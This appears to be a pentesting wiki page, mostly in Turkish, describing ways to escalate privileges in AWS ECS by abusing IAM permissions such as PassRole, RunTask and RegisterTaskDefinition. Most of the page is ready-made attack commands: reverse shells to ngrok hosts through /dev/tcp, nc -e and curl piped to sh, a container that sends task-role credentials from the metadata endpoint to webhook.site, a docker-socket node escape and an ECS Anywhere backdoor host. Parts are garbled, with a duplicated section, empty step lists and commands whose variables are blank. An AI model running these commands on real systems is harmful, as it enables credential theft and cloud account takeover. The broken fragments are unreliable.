# AWS - ECS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

ECS hakkında daha fazla **bilgi** için:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

ECS'de `iam:PassRole`, `ecs:RegisterTaskDefinition` ve `ecs:RunTask` izinlerini suistimal eden bir saldırgan, metadata kimlik bilgilerini çalan bir **kötü amaçlı container** içeren **yeni bir task definition oluşturabilir** ve bunu **çalıştırabilir**.

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

webhook.site gibi bir site kullanarak bir webhook oluşturun
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**Potential Impact:** Farklı bir ECS rolüne doğrudan privesc.

### `iam:PassRole`,`ecs:RunTask`
`iam:PassRole` ve `ecs:RunTask` izinlerine sahip bir saldırgan, değiştirilmiş **execution role**, **task role** ve konteynerin **command** değerleriyle yeni bir ECS task başlatabilir. `ecs run-task` CLI komutu, çalışma zamanında `executionRoleArn`, `taskRoleArn` ve konteynerin `command`'ını görev tanımına dokunmadan değiştirmeye izin veren `--overrides` bayrağını içerir.

`taskRoleArn` ve `executionRoleArn` için belirtilen IAM rolleri, trust policy'lerinde `ecs-tasks.amazonaws.com` tarafından üstlenilmesine izin verecek şekilde yapılandırılmalıdır.

Ayrıca saldırganın bilmesi gerekir:
- ECS küme adı
- VPC alt ağı
- Güvenlik grubu (Eğer güvenlik grubu belirtilmezse varsayılan kullanılacaktır)
- Task Definition adı ve revizyonu
- Konteynerin adı
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
Yukarıdaki kod parçasında saldırgan yalnızca `taskRoleArn` değerini geçersiz kılıyor. Ancak saldırının gerçekleşebilmesi için saldırganın komutta belirtilen `taskRoleArn` ve task tanımında belirtilen `executionRoleArn` üzerinde `iam:PassRole` iznine sahip olması gerekir.

Eğer saldırganın geçebildiği IAM rolü, ECR imajını çekmek ve ECS görevini başlatmak için yeterli ayrıcalıklara sahipse (`ecr:BatchCheckLayerAvailability`, `ecr:GetDownloadUrlForLayer`,`ecr:BatchGetImage`,`ecr:GetAuthorizationToken`), saldırgan `ecs run-task` komutunda hem `executionRoleArn` hem de `taskRoleArn` için aynı IAM rolünü belirtebilir.
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Potential Impact:** Herhangi bir ECS task role'üne doğrudan privesc.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Önceki örnekte olduğu gibi, ECS'de **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** izinlerini kötüye kullanan bir saldırgan, metadata kimlik bilgilerini çalan bir **kötücül container** içeren yeni bir task definition **üretebilir** ve **çalıştırabilir**.\
Ancak bu durumda, kötü amaçlı task definition'ı çalıştırmak için bir container instance gereklidir.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Olası Etki:** Herhangi bir ECS rolüne doğrudan privesc.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

Önceki örnekte olduğu gibi, ECS'teki **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** veya **`ecs:CreateService`** izinlerini kötüye kullanan bir saldırgan, metadata kimlik bilgilerini çalan bir **kötü amaçlı container** içeren **yeni bir task definition oluşturabilir** ve bunu en az 1 **task** çalışacak şekilde yeni bir **servis** oluşturarak **çalıştırabilir**.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Potential Impact:** Herhangi bir ECS role doğrudan privesc.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

Aslında, sadece bu izinlerle overrides kullanarak bir container içinde herhangi bir role ile keyfi komutlar çalıştırmak mümkün, örneğin:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**Olası Etki:** Herhangi bir ECS rolüne doğrudan privesc.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Bu senaryo öncekiyle benzer fakat **`iam:PassRole`** izni **olmadan**.\
Bu hâlâ ilginç çünkü eğer rastgele bir container çalıştırabiliyorsanız, rolü olmasa bile node'dan kaçmak için **privileged container** çalıştırabilir ve node üzerinde çalışan **EC2 IAM role** ile **diğer ECS container'larının rollerini** çalabilirsiniz.\
Hatta ele geçirdiğiniz EC2 instance'ında diğer task'ların çalışmasını **force other tasks to run inside the EC2 instance** zorlayarak onların kimlik bilgilerini çalabilirsiniz (detaylar için [**Privesc to node section**](aws-ecs-post-exploitation/README.md#privesc-to-node)).

> [!WARNING]
> Bu saldırı yalnızca **ECS cluster** EC2 instance'larını kullanıyorsa ve Fargate değilse mümkündür.
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Bir saldırganın **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** izinlerine sahip olması durumunda, çalışan bir container içinde **komutlar çalıştırabilir** ve ona bağlı IAM rolünü sızdırabilir (aws ecs execute-command komutunu çalıştırmak için describe izinlerine ihtiyaç vardır).\
Ancak, bunu yapabilmek için container instance'ın **ExecuteCommand agent**'ını çalıştırıyor olması gerekir (varsayılan olarak çalışmıyor).

Bu nedenle saldırgan şunları deneyebilir:

- **Her çalışan container'da bir komut çalıştırmayı dene**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
- Eğer kullanıcının **`ecs:RunTask`** izni varsa, `aws ecs run-task --enable-execute-command [...]` ile bir task çalıştırın
- Eğer kullanıcının **`ecs:StartTask`** izni varsa, `aws ecs start-task --enable-execute-command [...]` ile bir task çalıştırın
- Eğer kullanıcının **`ecs:CreateService`** izni varsa, `aws ecs create-service --enable-execute-command [...]` ile bir service oluşturun
- Eğer kullanıcının **`ecs:UpdateService`** izni varsa, `aws ecs update-service --enable-execute-command [...]` ile bir service güncelleyin

Bu seçeneklerin örneklerini **previous ECS privesc sections** içinde bulabilirsiniz.

**Potential Impact:** Konteynerlere bağlı farklı bir role privesc.

### `ssm:StartSession`

**ssm privesc page** üzerinde bu izni nasıl kötüye kullanarak **ECS'ye privesc** olabileceğinize bakın:

{{#ref}}
../aws-ssm-privesc/README.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

**ec2 privesc page** üzerinde bu izinleri nasıl kötüye kullanıp **ECS'ye privesc** yapabileceğinize bakın:

{{#ref}}
../aws-ec2-privesc/README.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

Bu izinlere sahip bir saldırgan, potansiyel olarak bir EC2 instance'ını bir ECS cluster'ına register edebilir ve üzerinde task'lar çalıştırabilir. Bu, saldırganın ECS task'ları bağlamında rastgele kod çalıştırmasına olanak sağlayabilir.

- TODO: Başka bir AWS hesabından bir instance register etmek ve böylece task'ların saldırganın kontrol ettiği makinelerde çalışmasını sağlamak mümkün mü??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Test this

Bu izinlere sahip bir saldırgan `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet` ve `ecs:DescribeTaskSets` ile mevcut bir ECS servisi için kötü amaçlı bir task set oluşturabilir ve primary task set'i güncelleyebilir. Bu, saldırganın servis içinde rastgele kod çalıştırmasına olanak tanır.
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Olası Etki**: Etkilenen serviste keyfi kod çalıştırabilir, hizmetin işlevselliğini etkileyebilir veya hassas verileri sızdırabilir.

## References

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)







### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

Bir saldırgan, ECS capacity provider'ları yönetme ve servisleri güncelleme izinlerine sahipse, kontrol ettiği bir EC2 Auto Scaling Group oluşturabilir, bunu bir ECS Capacity Provider ile sarmalayabilir, hedef cluster'a ilişkilendirip mağdur servisi bu provider'ı kullanacak şekilde taşıyabilir. Böylece task'lar saldırganın kontrolündeki EC2 instance'larına planlanır; bu da konteynerleri OS seviyesinde inceleme ve task role kimlik bilgilerini çalma imkanı verir.

Komutlar (us-east-1):

- Önkoşullar



- Hedef cluster'a katılacak ECS agent için Launch Template oluşturun



- Auto Scaling Group oluşturun



- ASG'den Capacity Provider oluşturun



- Capacity Provider'ı cluster'a ilişkilendirin (isteğe bağlı olarak varsayılan olarak)



- Bir servisi kendi provider'ınıza taşıyın



- Task'ların saldırgan instance'larına indiğini doğrulayın



- Opsiyonel: EC2 node'undan target konteyner'lara docker exec yapın ve task role kimlik bilgilerini elde etmek için http://169.254.170.2 adresini okuyun.

- Temizlik



**Olası Etki:** Saldırgan kontrollü EC2 node'ları mağdur task'larını alır; bu, konteynerlere OS seviyesinde erişim ve task IAM role kimlik bilgilerinin çalınmasına olanak sağlar.


<details>
<summary>Adım adım komutlar (kopyala/yapıştır)</summary>
<pre>
export AWS_DEFAULT_REGION=us-east-1
CLUSTER=arn:aws:ecs:us-east-1:947247140022:cluster/ht-victim-cluster
# Instance profile for ECS nodes
aws iam create-role --role-name ht-ecs-instance-role --assume-role-policy-document Version:2012-10-17 || true
aws iam attach-role-policy --role-name ht-ecs-instance-role --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role || true
aws iam create-instance-profile --instance-profile-name ht-ecs-instance-profile || true
aws iam add-role-to-instance-profile --instance-profile-name ht-ecs-instance-profile --role-name ht-ecs-instance-role || true

VPC=vpc-18e6ac62
SUBNETS=

AMI=ami-0b570770164588ab4
USERDATA=IyEvYmluL2Jhc2gKZWNobyBFQ1NfQ0xVU1RFUj0gPj4gL2V0Yy9lY3MvZWNzLmNvbmZpZwo=
LT_ID=

ASG_ARN=

CP_NAME=htcp-8797
aws ecs create-capacity-provider --name  --auto-scaling-group-provider "autoScalingGroupArn=,managedScaling={status=ENABLED,targetCapacity=100},managedTerminationProtection=DISABLED"
aws ecs put-cluster-capacity-providers --cluster "" --capacity-providers  --default-capacity-provider-strategy capacityProvider=,weight=1

SVC=
# Task definition must be EC2-compatible (not Fargate-only)
aws ecs update-service --cluster "" --service "" --capacity-provider-strategy capacityProvider=,weight=1 --force-new-deployment

TASK=
CI=
aws ecs describe-container-instances --cluster "" --container-instances "" --query containerInstances[0].ec2InstanceId --output text
</pre>
</details>

### Backdoor compute in-cluster via ECS Anywhere EXTERNAL registration

ECS Anywhere'ı kötüye kullanarak saldırgan kontrollü bir host'u, mağdur ECS cluster'ında EXTERNAL container instance olarak kaydedebilir ve bu host'ta ayrıcalıklı task ve execution rolleri kullanarak task'ları çalıştırabilirsiniz. Bu, task'ların nerede çalışacağı üzerinde OS seviyesinde kontrol sağlar (kendi makineniz) ve capacity provider'lar veya ASG'lerle uğraşmadan task'lardan ve bağlı volümlerden kimlik bilgisi/veri sızdırılmasına izin verir.

- Gerekli izinler (örnek minimum):
- ecs:CreateCluster (optional), ecs:RegisterTaskDefinition, ecs:StartTask or ecs:RunTask
- ssm:CreateActivation, ssm:DeregisterManagedInstance, ssm:DeleteActivation
- iam:CreateRole, iam:AttachRolePolicy, iam:DeleteRole, iam:PassRole (ECS Anywhere instance rolü ve task/execution rolleri için)
- logs:CreateLogGroup/Stream, logs:PutLogEvents (awslogs kullanılıyorsa)

- Etki: Saldırgan host üzerinde seçilen taskRoleArn ile keyfi container'lar çalıştırma; task-role kimlik bilgilerini 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI üzerinden sızdırma; task'lar tarafından mount edilmiş volümlere erişim; capacity provider/ASG manipülasyonuna göre daha gizli.

Adımlar

1) Cluster oluşturun/tespit edin (us-east-1)
```bash
aws ecs create-cluster --cluster-name ht-ecs-anywhere
```
2) ECS Anywhere rolü ve SSM aktivasyonu oluşturun (on-prem/EXTERNAL instance için)
```bash
aws iam create-role --role-name ecsAnywhereRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ssm.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role
ACTJSON=$(aws ssm create-activation --iam-role ecsAnywhereRole)
ACT_ID=$(echo $ACTJSON | jq -r .ActivationId); ACT_CODE=$(echo $ACTJSON | jq -r .ActivationCode)
```
3) Saldırgan hostu oluşturun ve onu EXTERNAL olarak otomatik kaydedin (örnek: küçük AL2 EC2 “on‑prem”)

<details>
<summary>user-data.sh</summary>
```bash
#!/bin/bash
set -euxo pipefail
amazon-linux-extras enable docker || true
yum install -y docker curl jq
systemctl enable --now docker
curl -fsSL -o /root/ecs-anywhere-install.sh "https://amazon-ecs-agent.s3.amazonaws.com/ecs-anywhere-install-latest.sh"
chmod +x /root/ecs-anywhere-install.sh
/root/ecs-anywhere-install.sh --cluster ht-ecs-anywhere --activation-id ${ACT_ID} --activation-code ${ACT_CODE} --region us-east-1
```
</details>
```bash
AMI=$(aws ssm get-parameters --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --query 'Parameters[0].Value' --output text)
IID=$(aws ec2 run-instances --image-id $AMI --instance-type t3.micro \
--user-data file://user-data.sh --query 'Instances[0].InstanceId' --output text)
aws ec2 wait instance-status-ok --instance-ids $IID
```
4) EXTERNAL konteyner örneğinin katıldığını doğrulayın
```bash
aws ecs list-container-instances --cluster ht-ecs-anywhere
aws ecs describe-container-instances --cluster ht-ecs-anywhere \
--container-instances <ci-arn> --query 'containerInstances[0].[ec2InstanceId,attributes]'
# ec2InstanceId will be mi-XXXXXXXX (SSM managed instance id) and attributes include ecs.capability.external
```
5) task/execution roles oluşturun, EXTERNAL task definition'ı kaydedin ve bunu attacker host üzerinde çalıştırın
```bash
# roles
aws iam create-role --role-name ht-ecs-task-exec \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ht-ecs-task-exec --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
aws iam create-role --role-name ht-ecs-task-role \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# attach any privileges you want to abuse to this task role

# task def (EXTERNAL launch)
cat > td-external.json << 'JSON'
{
"family": "ht-external",
"requiresCompatibilities": [ "EXTERNAL" ],
"networkMode": "bridge",
"memory": "256",
"cpu": "128",
"executionRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-exec",
"taskRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-role",
"containerDefinitions": [
{"name":"steal","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["REL=\$(printenv AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); echo CREDS:; curl -s http://169.254.170.2\$REL; sleep 600"],
"memory": 128,
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/anywhere","awslogs-stream-prefix":"steal"}}
}
]
}
JSON
aws logs create-log-group --log-group-name /ht/ecs/anywhere || true
aws ecs register-task-definition --cli-input-json file://td-external.json
CI=$(aws ecs list-container-instances --cluster ht-ecs-anywhere --query 'containerInstanceArns[0]' --output text)
aws ecs start-task --cluster ht-ecs-anywhere --task-definition ht-external \
--container-instances $CI
```
6) Buradan task'ları çalıştıran hostu kontrol edersiniz. Task log'larını okuyabilirsiniz (eğer awslogs ise) veya host üzerinde doğrudan exec yaparak task'larınızdaki kimlik bilgilerini/verileri sızdırabilirsiniz.



#### Command example (placeholders)




### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

ECS capacity provider'ları yönetme ve servisleri güncelleme izinlerine sahip bir saldırgan, kontrol ettiği bir EC2 Auto Scaling Group oluşturabilir, bunu bir ECS Capacity Provider içine sarabilir, hedef cluster'a iliştirebilir ve mağdur servisi bu provider'ı kullanacak şekilde taşıyabilir. Böylece task'lar saldırgan kontrollü EC2 instance'larına planlanır; bu da konteynerleri incelemek ve task role kimlik bilgilerini çalmak için OS seviyesinde erişim sağlar.

Commands (us-east-1):

- Ön Gereksinimler



- Hedef cluster'a katılmak için ECS agent'ın kullanacağı Launch Template oluşturun



- Auto Scaling Group oluşturun



- ASG'den Capacity Provider oluşturun



- Capacity Provider'ı cluster'a iliştirin (isteğe bağlı olarak varsayılan yapabilirsiniz)



- Bir servisi provider'ınıza taşıyın



- Task'ların saldırgan instance'larına düştüğünü doğrulayın



- Opsiyonel: EC2 node'undan, docker exec ile hedef konteynerlere girin ve task role kimlik bilgilerini almak için http://169.254.170.2 adresini okuyun.

- Temizlik



**Olası Etki:** Saldırgan kontrollü EC2 node'larına mağdur task'ları yerleştirilir; bu, konteynerlere OS seviyesinde erişim ve task IAM role kimlik bilgilerinin çalınmasına izin verir.
{{#include ../../../../banners/hacktricks-training.md}}
